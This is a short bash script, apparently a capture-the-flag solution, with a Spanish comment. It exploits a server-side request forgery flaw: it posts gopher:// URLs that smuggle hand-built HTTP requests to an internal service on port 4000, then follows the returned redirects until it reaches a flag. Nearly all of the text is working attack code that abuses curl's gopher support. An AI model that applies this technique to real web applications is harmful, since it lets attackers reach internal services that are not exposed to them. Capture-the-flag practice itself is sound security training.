IP="127.0.0.1:5000" # change this
endpoint="begin"

while true; do
    echo "$endpoint"

    endpoint=$(curl $IP/POSTthis -d "url=gopher://127.0.0.1:4000/_GET%2520/$endpoint%2520HTTP/1.1%250D%250AHost:%2520127.0.0.1:4000%250D%250AUser-Agent:%2520curl/7.68.0%250D%250AAccept:%2520*/*%250D%250A" -s | \
    grep "Location" | cut -d'#' -f2)

    if [[ "$endpoint" == *"{"* ]]; then
        echo "FLAG: $endpoint"
        exit
    fi
done


# cURL admite gopher://, esquema que permite enviar paquetes arbitrarios a cualquier dirección. Se puede emular una petición HTTP crafteada manualmente
# y recibir su contenido, así pudiendo peticionar el webserver desde localhost y completar el reto, que es seguir los endpoints generados.